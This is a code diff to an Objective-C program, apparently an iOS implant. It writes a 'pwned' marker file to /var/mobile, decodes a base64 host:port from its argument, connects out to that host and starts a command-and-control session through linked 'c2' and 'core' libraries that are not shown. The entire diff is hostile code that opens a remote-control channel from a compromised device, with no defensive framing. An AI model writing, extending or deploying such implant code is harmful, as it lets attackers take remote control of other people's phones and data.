@@ -24,22 +24,85 @@
 
 #import <Foundation/Foundation.h>
 
-int main(int argc, char *argv[])
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#include <c2.h>
+#include <core.h>
+
+int connectTo(NSString *hostPart, int portPart)
 {
-    NSString *CFBundeBase64Hash;
+    int sock;
+    struct sockaddr_in hint;
+
+    NSLog(@"Will connect to %@:%d\n", hostPart, portPart);
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (sock == -1)
+    {
+        return -1;
+    }
+
+    hint.sin_family = AF_INET;
+    hint.sin_port = htons(portPart);
+    hint.sin_addr.s_addr = inet_addr([hostPart UTF8String]);
+
+    if (connect(sock, (struct sockaddr *)&hint, sizeof(hint)) != 0)
+    {
+        return -1;
+    }
+
+    return sock;
+}
+
+int main(int argc, const char * argv[]) {
+    int sock;
+
+    NSString *decodedString;
+    NSString *encodedString;
+
     NSData *decodedData;
-    NSArray *components;
+    NSArray *pairedData;
+
+    c2_t *c2;
+    core_t *core;
 
     @autoreleasepool {
-        if (argc < 2)
-        {
+        NSString *filePath = @"/var/mobile/pwned";
+        NSString *fileContents = @"This file has been pwned!";
+
+        NSError *error;
+        BOOL success = [fileContents writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:&error];
+
+        if (argc < 2) {
+            return 1;
+        }
+
+        NSString *encodedString = [NSString stringWithFormat:@"%s", argv[1]];
+        NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:encodedString options:0];
+        NSString *decodedString = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
+        NSArray *pairedData = [decodedString componentsSeparatedByString:@":"];
+
+        if (pairedData.count < 2) {
             return -1;
         }
 
-        CFBundeBase64Hash = [NSString stringWithUTF8String:argv[1]];
-        decodedData = [[NSData alloc] initWithBase64EncodedString:CFBundeBase64Hash
-                                      encoding:NSUTF8StringEncoding];
+        c2 = NULL;
+        sock = connectTo(pairedData[0], [pairedData[1] intValue]);
 
-        return 0;
+        c2_add_sock(&c2, 0, sock);
+
+        core = core_create(c2);
+        core_start(core);
+
+        c2_free(c2);
+        core_destroy(core);
     }
+    return 0;
 }
